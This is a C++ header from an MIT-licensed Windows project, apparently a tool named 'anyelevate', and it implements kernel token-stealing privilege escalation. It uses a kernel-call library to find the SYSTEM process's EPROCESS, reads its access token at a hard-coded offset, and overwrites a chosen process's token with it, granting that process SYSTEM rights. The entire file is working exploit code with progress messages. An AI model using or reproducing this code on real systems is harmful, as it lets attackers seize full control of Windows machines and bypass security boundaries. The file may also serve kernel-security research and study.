/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#pragma once
#include <windows.h>
#include <iostream>
#include <Lmcons.h>

#include "nt.hpp"
#include "libanycall.h"
#include "kernel.hpp"
#include "color.hpp"

#define RVA_PEPROCESS_TOKEN 0x4b8

#define PRINT_WHOAMI() \
	std::cout << "[+] whoami: " << dye::red(whoami().c_str()) << std::endl;

namespace anyelevate
{
	inline PEPROCESS system_process = {};
	inline EX_FAST_REF system_process_token = {};

	//
	// system process's PID is always 4
	//
	inline constexpr uint32_t SYSTEM_PROCESS_PID = 4;

	std::string whoami()
	{
		char buffer[ UNLEN + 1 ];
		DWORD length = UNLEN + 1;
		GetUserNameA( buffer, &length );
		return std::string( buffer );
	}

	bool init()
	{
		NTSTATUS nt_status;

		nt_status =
			ANYCALL_INVOKE( PsLookupProcessByProcessId, 
				( HANDLE )SYSTEM_PROCESS_PID, &system_process );

		if ( !NT_SUCCESS( nt_status ) )
		{
			printf( "[!] failed to fetch PEPROCESS (0x%lX)\n", nt_status );
			return false;
		}

		printf( "[+] PEPROCESS of system process @ %p\n", system_process );
		printf( "[~] snatching token...\n" );

		kernel::memcpy( 
			&system_process_token, 
			( void* )(( uint64_t )system_process + RVA_PEPROCESS_TOKEN ), 
			sizeof( EX_FAST_REF ) );

		printf( " ---> Token.Object : %p\n", system_process_token.Object );
		printf( " ---> Token.RefCnt : %d\n", system_process_token.RefCnt );
		printf( " ---> Token.Value  : %lX\n", system_process_token.Value );

		if ( !system_process_token.Object )
			return false;

		PRINT_WHOAMI();

		return true;
	}

	bool elevate( const uint32_t process_id )
	{
		NTSTATUS nt_status;
		PEPROCESS process;

		printf( "[+] snatching PEPROCESS of PID %d\n", process_id );

		nt_status =
			ANYCALL_INVOKE( PsLookupProcessByProcessId,
				( HANDLE )process_id, &process );

		if ( !process )
		{
			printf( "[!] failed to snatch PEPROCESS of PID %d\n", 
				process_id );
			return false;
		}

		printf( "[~] maniplating token of PID %d\n", process_id );

		kernel::memcpy(
			( void* )( ( uint64_t )process + RVA_PEPROCESS_TOKEN ),
			&system_process_token,
			sizeof( EX_FAST_REF ) );

		printf( "[+] manipulated!\n" );

		PRINT_WHOAMI();

		printf( "[+] done\n" );
		return true;
	}
}